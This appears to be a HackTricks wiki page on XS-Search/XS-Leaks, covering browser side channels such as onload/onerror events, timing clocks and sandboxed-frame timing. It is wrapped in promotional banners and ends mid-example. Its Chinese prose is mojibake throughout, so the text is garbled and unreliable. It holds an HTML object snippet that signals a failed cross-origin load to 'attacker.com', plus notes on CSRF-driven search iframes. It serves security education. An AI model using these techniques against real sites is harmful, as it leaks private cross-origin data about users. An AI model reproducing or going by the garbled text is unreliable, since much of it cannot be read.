# XS-Search/XS-Leaks

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **åŸºæœ¬ä¿¡æ¯**

XS-Searchæ˜¯ä¸€ç§é¢å‘**åˆ©ç”¨ä¾§ä¿¡é“æ”»å‡»**çªƒå–è·¨æºä¿¡æ¯çš„æŠ€æœ¯ã€‚

è¿™ç§æ”»å‡»åŒ…å«ä»¥ä¸‹ä¸åŒçš„å…ƒç´ ï¼š

* **æ˜“å—æ”»å‡»çš„Web**: æˆ‘ä»¬æƒ³è¦çªƒå–ä¿¡æ¯çš„Web
* **æ”»å‡»è€…çš„Web**: æ”»å‡»è€…åˆ›å»ºçš„åŒ…å«æ¼æ´åˆ©ç”¨çš„Webï¼Œå—å®³è€…è®¿é—®è¯¥Web
* **åŒ…å«æ–¹æ³•**: ç”¨äºä»æ”»å‡»è€…çš„WebåŠ è½½æ˜“å—æ”»å‡»çš„Webçš„æ–¹æ³•ï¼ˆå¦‚window.openã€iframeã€fetchã€å¸¦æœ‰hrefçš„HTMLæ ‡ç­¾ç­‰ï¼‰
* **æ³„æ¼æŠ€æœ¯**: åœ¨è®¿é—®æ˜“å—æ”»å‡»çš„Webä¹‹åï¼Œå°†ä½¿ç”¨ä¸€ç§æŠ€æœ¯æ¥åŒºåˆ†ä»ä½¿ç”¨çš„åŒ…å«æ–¹æ³•è·å¾—çš„ä¿¡æ¯ä¸Webçš„æ½œåœ¨çŠ¶æ€ä¹‹é—´çš„å·®å¼‚ã€‚
* **çŠ¶æ€**: æ˜“å—æ”»å‡»çš„Webå¯èƒ½å…·æœ‰çš„2ç§å¯èƒ½çŠ¶æ€ï¼Œå–å†³äºæˆ‘ä»¬è¦åŒºåˆ†çš„å—å®³è€…ã€‚
* **å¯æ£€æµ‹çš„å·®å¼‚**: è¿™æ˜¯æ”»å‡»è€…å¿…é¡»å°è¯•ç¡®å®šæ˜“å—æ”»å‡»çš„WebçŠ¶æ€çš„ä¿¡æ¯ã€‚

### å¯æ£€æµ‹çš„å·®å¼‚

ä¸ºäº†åŒºåˆ†æ˜“å—æ”»å‡»é¡µé¢çš„2ç§çŠ¶æ€ï¼Œå¯ä»¥æŸ¥çœ‹ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

* **çŠ¶æ€ç **ã€‚æ”»å‡»è€…å¯ä»¥åŒºåˆ†è·¨æºçš„**ä¸åŒHTTPå“åº”çŠ¶æ€ç **ï¼ˆä¾‹å¦‚ï¼ŒæœåŠ¡å™¨é”™è¯¯ã€å®¢æˆ·ç«¯é”™è¯¯æˆ–èº«ä»½éªŒè¯é”™è¯¯ï¼‰ã€‚
* **APIä½¿ç”¨**ã€‚è¿™ç§å¯æ£€æµ‹çš„å·®å¼‚å…è®¸æ”»å‡»è€…æ£€æµ‹é¡µé¢ä¹‹é—´çš„**Web APIä½¿ç”¨**ï¼Œä»è€Œæ¨æ–­è·¨æºé¡µé¢æ˜¯å¦ä½¿ç”¨ç‰¹å®šçš„JavaScript Web APIã€‚
* **é‡å®šå‘**ã€‚å¯ä»¥æ£€æµ‹åˆ°Webåº”ç”¨ç¨‹åºæ˜¯å¦**å°†ç”¨æˆ·å¯¼èˆªåˆ°å…¶ä»–é¡µé¢**ã€‚è¿™ä¸ä»…é™äºHTTPé‡å®šå‘ï¼Œè¿˜åŒ…æ‹¬ç”±JavaScriptæˆ–HTMLè§¦å‘çš„é‡å®šå‘ã€‚
* **é¡µé¢å†…å®¹**ã€‚è¿™äº›å¯æ£€æµ‹çš„**å·®å¼‚å‡ºç°åœ¨HTTPå“åº”æ­£æ–‡**æœ¬èº«æˆ–é¡µé¢åŒ…å«çš„å­èµ„æºä¸­ã€‚ä¾‹å¦‚ï¼Œè¿™å¯èƒ½æ˜¯åŒ…å«çš„å¸§çš„æ•°é‡ï¼ˆå‚è§Gitlabä¸Šçš„XS-Leakï¼‰æˆ–å›¾åƒçš„å¤§å°å·®å¼‚ã€‚
* **HTTPå¤´**ã€‚æ”»å‡»è€…å¯ä»¥æ£€æµ‹åˆ°ç‰¹å®šçš„HTTPå“åº”å¤´çš„å­˜åœ¨ï¼Œå¹¶å¯èƒ½èƒ½å¤Ÿæ”¶é›†å…¶å€¼ã€‚è¿™åŒ…æ‹¬è¯¸å¦‚X-Frame-Optionsã€Content-Dispositionå’ŒCross-Origin-Resource-Policyç­‰å¤´ã€‚
* **æ—¶é—´**ï¼šæ”»å‡»è€…å¯ä»¥æ£€æµ‹åˆ°ä¸¤ä¸ªçŠ¶æ€ä¹‹é—´å­˜åœ¨ä¸€è‡´çš„æ—¶é—´å·®å¼‚ã€‚

### åŒ…å«æ–¹æ³•

* **HTMLå…ƒç´ **ã€‚HTMLæä¾›äº†å„ç§å…ƒç´ ï¼Œå¯ä»¥å®ç°**è·¨æºèµ„æºåŒ…å«**ã€‚åƒæ ·å¼è¡¨ã€å›¾åƒæˆ–è„šæœ¬ç­‰å…ƒç´ ä¼šå¼ºåˆ¶å—å®³è€…çš„æµè§ˆå™¨è¯·æ±‚æŒ‡å®šçš„éHTMLèµ„æºã€‚å¯ä»¥åœ¨ç½‘ä¸Šæ‰¾åˆ°åˆ—ä¸¾æ­¤ç›®çš„å¯èƒ½çš„HTMLå…ƒç´ çš„åˆ—è¡¨ï¼ˆ[https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)ï¼‰ã€‚
* **æ¡†æ¶**ã€‚è¯¸å¦‚**iframe**ã€**object**å’Œ**embed**ä¹‹ç±»çš„å…ƒç´ å¯ä»¥ç›´æ¥å°†å…¶ä»–HTMLèµ„æºåµŒå…¥åˆ°æ”»å‡»è€…é¡µé¢ä¸­ã€‚å¦‚æœé¡µé¢**ä¸ä½¿ç”¨æ¡†æ¶ä¿æŠ¤**ï¼ŒJavaScriptä»£ç å¯ä»¥é€šè¿‡contentWindowå±æ€§è®¿é—®åµŒå…¥èµ„æºçš„çª—å£å¯¹è±¡ã€‚
* **å¼¹å‡ºçª—å£**ã€‚**`window.open`**æ–¹æ³•åœ¨æ–°çš„æµè§ˆå™¨æ ‡ç­¾æˆ–çª—å£ä¸­åŠ è½½èµ„æºã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª**çª—å£å¥æŸ„**ï¼ŒJavaScriptä»£ç å¯ä»¥ä½¿ç”¨è¯¥å¥æŸ„è®¿é—®ç¬¦åˆSOPçš„æ–¹æ³•å’Œå±æ€§ã€‚è¿™äº›æ‰€è°“çš„å¼¹å‡ºçª—å£é€šå¸¸ç”¨äºå•ç‚¹ç™»å½•ã€‚ç°ä»£æµè§ˆå™¨ä»…åœ¨ç”±æŸäº›ç”¨æˆ·äº¤äº’è§¦å‘æ—¶å…è®¸å¼¹å‡ºçª—å£ã€‚å¯¹äºXS-Leakæ”»å‡»ï¼Œæ­¤æ–¹æ³•ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºå®ƒ**ç»•è¿‡äº†ç›®æ ‡èµ„æºçš„æ¡†æ¶å’Œcookieé™åˆ¶**ã€‚è¾ƒæ–°çš„æµè§ˆå™¨ç‰ˆæœ¬æœ€è¿‘æ·»åŠ äº†éš”ç¦»çª—å£å¥æŸ„çš„æ–¹æ³•ã€‚
* **JavaScriptè¯·æ±‚**ã€‚JavaScriptå…è®¸ç›´æ¥å‘ç›®æ ‡èµ„æºå‘é€è¯·æ±‚ã€‚æœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼å¯ä»¥å®ç°è¿™ä¸€ç›®çš„ï¼š**XMLHttpRequests**åŠå…¶åç»§è€…**Fetch API**ã€‚ä¸å…ˆå‰çš„åŒ…å«æ–¹æ³•ç›¸æ¯”ï¼Œæ”»å‡»è€…å¯¹å‘å‡ºçš„è¯·æ±‚å…·æœ‰ç»†ç²’åº¦çš„æ§åˆ¶ï¼Œä¾‹å¦‚æ˜¯å¦è‡ªåŠ¨è·ŸéšHTTPé‡å®šå‘ã€‚
### æ³„æ¼æŠ€æœ¯

* **äº‹ä»¶å¤„ç†ç¨‹åº**ã€‚äº‹ä»¶å¤„ç†ç¨‹åºå¯ä»¥è¢«è§†ä¸ºXS-Leaksçš„ç»å…¸æ³„æ¼æŠ€æœ¯ã€‚å®ƒä»¬æ˜¯å„ç§ä¿¡æ¯çš„ä¼—æ‰€å‘¨çŸ¥çš„æ¥æºã€‚ä¾‹å¦‚ï¼Œ**onload**çš„è§¦å‘è¡¨ç¤ºèµ„æºåŠ è½½æˆåŠŸï¼Œè€Œonerroräº‹ä»¶åˆ™è¡¨ç¤ºåŠ è½½å¤±è´¥ã€‚
* **é”™è¯¯æ¶ˆæ¯**ã€‚é™¤äº†äº‹ä»¶å¤„ç†ç¨‹åºï¼Œé”™è¯¯æ¶ˆæ¯å¯ä»¥ä½œä¸ºJavaScriptå¼‚å¸¸å’Œç‰¹æ®Šé”™è¯¯é¡µé¢å‡ºç°ã€‚é”™è¯¯æ¶ˆæ¯å¯ä»¥åœ¨ä¸åŒçš„æ­¥éª¤ä¸­æŠ›å‡ºï¼Œä¾‹å¦‚ï¼Œç›´æ¥ç”±æ³„æ¼æŠ€æœ¯æŠ›å‡ºã€‚æ³„æ¼æŠ€æœ¯å¯ä»¥ç›´æ¥ä½¿ç”¨é”™è¯¯æ¶ˆæ¯ä¸­åŒ…å«çš„é™„åŠ ä¿¡æ¯ï¼Œæˆ–è€…åŒºåˆ†é”™è¯¯æ¶ˆæ¯çš„å‡ºç°å’Œç¼ºå¤±ã€‚
* **å…¨å±€é™åˆ¶**ã€‚æ¯å°è®¡ç®—æœºéƒ½æœ‰å…¶ç‰©ç†é™åˆ¶ï¼Œæµè§ˆå™¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¾‹å¦‚ï¼Œå¯ç”¨å†…å­˜çš„æ•°é‡é™åˆ¶äº†æµè§ˆå™¨è¿è¡Œçš„æ ‡ç­¾é¡µã€‚å¯¹äºæ•´ä¸ªæµè§ˆå™¨å¼ºåˆ¶æ‰§è¡Œçš„å…¶ä»–æµè§ˆå™¨é™åˆ¶ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿç¡®å®šä½•æ—¶è¾¾åˆ°é™åˆ¶ï¼Œè¿™å¯ä»¥ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚
* **å…¨å±€çŠ¶æ€**ã€‚æµè§ˆå™¨å…·æœ‰æ‰€æœ‰é¡µé¢éƒ½å¯ä»¥ç›¸äº’äº¤äº’çš„å…¨å±€çŠ¶æ€ã€‚å¦‚æœæ”»å‡»è€…çš„ç½‘ç«™å¯ä»¥æ£€æµ‹åˆ°è¿™ç§äº¤äº’ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œ**History**æ¥å£å…è®¸æ“ä½œåœ¨æ ‡ç­¾é¡µæˆ–æ¡†æ¶ä¸­è®¿é—®çš„é¡µé¢ã€‚è¿™åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€çŠ¶æ€ï¼Œå› ä¸ºæ¡ç›®çš„æ•°é‡å…è®¸æ”»å‡»è€…æ¨æ–­è·¨æºé¡µé¢ã€‚
* **æ€§èƒ½API**ã€‚æ€§èƒ½APIç”¨äºè®¿é—®å½“å‰é¡µé¢çš„æ€§èƒ½ä¿¡æ¯ã€‚å®ƒä»¬çš„æ¡ç›®åŒ…æ‹¬æ–‡æ¡£å’Œé¡µé¢åŠ è½½çš„æ¯ä¸ªèµ„æºçš„è¯¦ç»†ç½‘ç»œè®¡æ—¶æ•°æ®ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ¨æ–­å‡ºè¯·æ±‚çš„èµ„æºã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å‘ç°æŸäº›è¯·æ±‚æµè§ˆå™¨ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®çš„æƒ…å†µã€‚
* **å¯è¯»å±æ€§**ã€‚HTMLæœ‰å‡ ä¸ªå¯è·¨æºè¯»å–çš„å±æ€§ã€‚è¿™ç§è¯»å–è®¿é—®å¯ä»¥ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼ŒJavaScriptä»£ç å¯ä»¥ä½¿ç”¨window.frame.lengthå±æ€§è·¨æºè¯»å–åŒ…å«åœ¨ç½‘é¡µä¸­çš„å¸§æ•°ã€‚

#### åŸºäºæ—¶é—´çš„æŠ€æœ¯

ä»¥ä¸‹ä¸€äº›æŠ€æœ¯å°†ä½¿ç”¨æ—¶é—´ä½œä¸ºæ£€æµ‹ç½‘é¡µå¯èƒ½çŠ¶æ€å·®å¼‚çš„è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚åœ¨Webæµè§ˆå™¨ä¸­æœ‰ä¸åŒçš„æµ‹é‡æ—¶é—´çš„æ–¹æ³•ã€‚

**æ—¶é’Ÿ**ï¼š[performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) APIå…è®¸å¼€å‘äººå‘˜è·å–é«˜åˆ†è¾¨ç‡çš„æ—¶é—´æµ‹é‡ã€‚\
æ”»å‡»è€…å¯ä»¥æ»¥ç”¨å¤§é‡APIæ¥åˆ›å»ºéšå¼æ—¶é’Ÿï¼š[Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API)ã€[Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel)ã€[requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)ã€[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)ã€CSSåŠ¨ç”»ç­‰ã€‚\
æ›´å¤šä¿¡æ¯ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/)ã€‚

## XSinator

XSinatoræ˜¯ä¸€ä¸ªè‡ªåŠ¨å·¥å…·ï¼Œç”¨äºæ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å­˜åœ¨å¤šä¸ªå·²çŸ¥çš„XS-Leaksï¼Œå…¶åœ¨å…¶è®ºæ–‡ä¸­æœ‰è¯¦ç»†è§£é‡Šï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
æ‚¨å¯ä»¥åœ¨[https://xsinator.com/](https://xsinator.com/)ä¸Šè®¿é—®è¯¥å·¥å…·ã€‚

{% hint style="warning" %}
**æ’é™¤çš„XS-Leaks**ï¼šæˆ‘ä»¬ä¸å¾—ä¸æ’é™¤ä¾èµ–äº**æœåŠ¡å·¥ä½œè€…**çš„XS-Leaksï¼Œå› ä¸ºå®ƒä»¬ä¼šå¹²æ‰°XSinatorä¸­çš„å…¶ä»–æ³„æ¼ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬é€‰æ‹©**æ’é™¤ä¾èµ–äºç‰¹å®šWebåº”ç”¨ç¨‹åºä¸­çš„é…ç½®é”™è¯¯å’Œé”™è¯¯çš„XS-Leaks**ã€‚ä¾‹å¦‚ï¼Œè·¨æºèµ„æºå…±äº«ï¼ˆCORSï¼‰é…ç½®é”™è¯¯ã€postMessageæ³„æ¼æˆ–è·¨ç«™è„šæœ¬ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜æ’é™¤äº†åŸºäºæ—¶é—´çš„XS-Leaksï¼Œå› ä¸ºå®ƒä»¬å¾€å¾€é€Ÿåº¦æ…¢ã€å™ªéŸ³å¤§ä¸”ä¸å‡†ç¡®ã€‚
{% endhint %}

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## äº‹ä»¶å¤„ç†ç¨‹åºæŠ€æœ¯

### Onload/Onerror

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ã€HTMLå…ƒç´ 
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu)ã€[https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **æ‘˜è¦**ï¼šå¦‚æœå°è¯•åŠ è½½èµ„æºæ—¶è§¦å‘onerror/onloadäº‹ä»¶ï¼Œå¯ä»¥é€šè¿‡çŠ¶æ€ç æ¥ç¡®å®šèµ„æºçš„çŠ¶æ€ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

ä»£ç ç¤ºä¾‹å°è¯•ä»JSä¸­åŠ è½½è„šæœ¬å¯¹è±¡ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ ‡ç­¾ï¼Œå¦‚å¯¹è±¡ã€æ ·å¼è¡¨ã€å›¾åƒã€éŸ³é¢‘ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ç›´æ¥æ³¨å…¥æ ‡ç­¾ï¼Œå¹¶åœ¨æ ‡ç­¾å†…å£°æ˜`onload`å’Œ`onerror`äº‹ä»¶ï¼ˆè€Œä¸æ˜¯ä»JSä¸­æ³¨å…¥ï¼‰ã€‚

è¿˜æœ‰ä¸€ä¸ªæ— éœ€è„šæœ¬çš„æ”»å‡»ç‰ˆæœ¬ï¼š
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ‰¾ä¸åˆ°`example.com/404`ï¼Œå°†åŠ è½½`attacker.com/?error`ã€‚

### Onload Timing

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **æ‘˜è¦**ï¼šå¯ä»¥ä½¿ç”¨\*\*\*\*[**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API**æ¥æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ç„¶è€Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿï¼Œä¾‹å¦‚[**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)ï¼Œå®ƒå¯ä»¥è¯†åˆ«è¿è¡Œæ—¶é—´è¶…è¿‡50æ¯«ç§’çš„ä»»åŠ¡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) å¦ä¸€ä¸ªç¤ºä¾‹åœ¨ï¼š

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

è¿™ç§æŠ€æœ¯ä¸å‰ä¸€ç§ç±»ä¼¼ï¼Œä½†**æ”»å‡»è€…**è¿˜å°†åœ¨**ç­”æ¡ˆä¸ºæ­£æˆ–è´Ÿæ—¶**å¼ºåˆ¶æ‰§è¡ŒæŸäº›æ“ä½œï¼Œä»¥æµ‹é‡æ‰€éœ€çš„æ—¶é—´ã€‚

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **æ‘˜è¦**ï¼šå¯ä»¥ä½¿ç”¨[SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers)æ¥æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

[`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event)å’Œ[`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event)äº‹ä»¶å¯ç”¨äºæµ‹é‡è·å–èµ„æºæ‰€éœ€çš„æ—¶é—´ã€‚è¿™æ˜¯å› ä¸ºå½“æµè§ˆå™¨è¯·æ±‚æ–°çš„å¯¼èˆªè¯·æ±‚æ—¶ï¼Œä¼šè§¦å‘**`beforeunload`**ï¼Œè€Œå½“è¯¥å¯¼èˆªå®é™…å‘ç”Ÿæ—¶ï¼Œä¼šè§¦å‘**`unload`**ã€‚ç”±äºè¿™ç§è¡Œä¸ºï¼Œå¯ä»¥è®¡ç®—è¿™ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´çš„æ—¶é—´å·®ï¼Œå¹¶æµ‹é‡æµè§ˆå™¨å®Œæˆè·å–èµ„æºæ‰€èŠ±è´¹çš„æ—¶é—´ã€‚

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **æ‘˜è¦**ï¼šå¯ä»¥ä½¿ç”¨[performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) APIæ¥æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

å¦‚æœé¡µé¢æ²¡æœ‰å®æ–½ä»»ä½•[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/)ï¼Œæ”»å‡»è€…å¯ä»¥è®¡ç®—é¡µé¢å’Œæ‰€æœ‰å­èµ„æºåœ¨ç½‘ç»œä¸ŠåŠ è½½æ‰€éœ€çš„æ—¶é—´ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œiframeçš„`onload`å¤„ç†ç¨‹åºåœ¨æ‰€æœ‰èµ„æºåŠ è½½å®Œæˆå¹¶ä¸”æ‰€æœ‰JavaScriptæ‰§è¡Œå®Œæˆåè°ƒç”¨ã€‚ä½†æ˜¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨`<iframe>`ä¸­åŒ…å«[`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)å±æ€§æ¥æ¶ˆé™¤è„šæœ¬æ‰§è¡Œçš„å¹²æ‰°ã€‚è¯¥å±æ€§é˜»æ­¢äº†è®¸å¤šåŠŸèƒ½ï¼ŒåŒ…æ‹¬JavaScriptæ‰§è¡Œï¼Œä»è€Œå‡ ä¹çº¯ç²¹åœ°è¿›è¡Œç½‘ç»œæµ‹é‡ã€‚

### #ID + error + onload

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š
* **æ‘˜è¦**ï¼šå¦‚æœå¯ä»¥ä½¿é¡µé¢åœ¨è®¿é—®æ­£ç¡®å†…å®¹æ—¶å‡ºé”™ï¼Œå¹¶åœ¨è®¿é—®ä»»ä½•å†…å®¹æ—¶æ­£ç¡®åŠ è½½ï¼Œé‚£ä¹ˆå¯ä»¥åˆ¶ä½œä¸€ä¸ªå¾ªç¯æ¥æå–æ‰€æœ‰ä¿¡æ¯ï¼Œè€Œæ— éœ€æµ‹é‡æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

å‡è®¾å¯ä»¥å°†åŒ…å«**ç§˜å¯†**å†…å®¹çš„**é¡µé¢****æ’å…¥åˆ°Iframe**ä¸­ã€‚

å¯ä»¥ä½¿ç”¨ä¸€ä¸ª**Iframe**ï¼ˆä¾‹å¦‚åˆ©ç”¨CSRFï¼‰è®©å—å®³è€…æœç´¢åŒ…å«â€œ_**flag**_â€çš„æ–‡ä»¶ã€‚åœ¨Iframeå†…éƒ¨ï¼Œå¯ä»¥çŸ¥é“**`onload`äº‹ä»¶**å°†å§‹ç»ˆè‡³å°‘æ‰§è¡Œä¸€æ¬¡ã€‚ç„¶åï¼Œå¯ä»¥é€šè¿‡ä»…æ›´æ”¹URLä¸­çš„å“ˆå¸Œå†…å®¹æ¥**æ›´æ”¹****iframe**çš„**URL**ã€‚

ä¾‹å¦‚ï¼š

1. **URL1**ï¼šwww.attacker.com/xssearch#try1
2. **URL2**ï¼šwww.attacker.com/xssearch#try2

